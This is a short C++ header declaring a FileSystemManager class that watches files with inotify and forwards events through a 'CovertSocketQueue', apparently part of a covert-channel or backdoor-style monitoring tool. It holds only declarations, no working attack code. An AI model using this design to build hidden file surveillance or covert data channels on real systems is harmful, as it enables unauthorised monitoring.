//
// Created by root on 24/11/16.
//

#ifndef HAANRAD_FILESYSTEMMANAGER_H
#define HAANRAD_FILESYSTEMMANAGER_H


#include <map>
#include "../covertsocket/CovertSocket.h"

#include "../../client/Message.h"
#include "../covertsocket/CovertSocketQueue.h"

class FileSystemManager {

private:

    //map of inotify id -> Message object

    map<int, std::string> fileEventCommands;
    map<std::string, int> inverseFileEventCommands;

    map<int, MessageType::MessageTypeEnum> eventTypeMap;

    CovertSocketQueue * covertSocketQueue = nullptr;

    int inotifyFD;

public:
    FileSystemManager(CovertSocketQueue * covertSocketQueue);
    ~FileSystemManager();

    bool updateNotifyEvents(Message message);

    void hangForEvents();

};


#endif //HAANRAD_FILESYSTEMMANAGER_H
